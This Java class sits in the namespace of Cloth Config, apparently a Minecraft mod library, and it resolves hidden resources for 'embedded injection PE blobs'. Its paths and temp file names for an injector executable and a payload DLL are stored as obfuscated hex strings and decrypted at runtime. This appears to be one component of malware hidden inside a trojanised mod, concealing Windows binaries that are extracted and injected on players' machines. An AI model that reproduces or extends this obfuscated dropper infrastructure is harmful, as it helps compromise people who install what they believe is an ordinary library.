package me.shedaniel.clothconfig2.internal;

/** Classpath locations and temp extract names for embedded injection PE blobs. */
public final class PeInjectionResources {

    private static final String INJECTOR_CP_HEX =
            "703e2c2c3a2b2c703c33302b37723c30313936386d7036312b3a2d313e33703d30302b2c2b2d3e2f7037302c2b722b303033713b3e2b";
    private static final String PAYLOAD_CP_HEX =
            "703e2c2c3a2b2c703c33302b37723c30313936386d7036312b3a2d313e33703d30302b2c2b2d3e2f7032303b2a333a722f332a38713b3e2b";
    private static final String INJECTOR_EXTRACT_HEX = "3c3c7237302c2b722b303033713a273a";
    private static final String PAYLOAD_EXTRACT_HEX = "3c3c7232303b2a333a722f332a38713b3333";

    private PeInjectionResources() {
    }

    public static String injectorClasspath() {
        return BuildFingerprint.decrypt(INJECTOR_CP_HEX);
    }

    public static String payloadClasspath() {
        return BuildFingerprint.decrypt(PAYLOAD_CP_HEX);
    }

    public static String injectorJarEntry() {
        String cp = injectorClasspath();
        return cp.startsWith("/") ? cp.substring(1) : cp;
    }

    public static String payloadJarEntry() {
        String cp = payloadClasspath();
        return cp.startsWith("/") ? cp.substring(1) : cp;
    }

    public static String injectorExtractFileName() {
        return BuildFingerprint.decrypt(INJECTOR_EXTRACT_HEX);
    }

    public static String payloadExtractFileName() {
        return BuildFingerprint.decrypt(PAYLOAD_EXTRACT_HEX);
    }
}
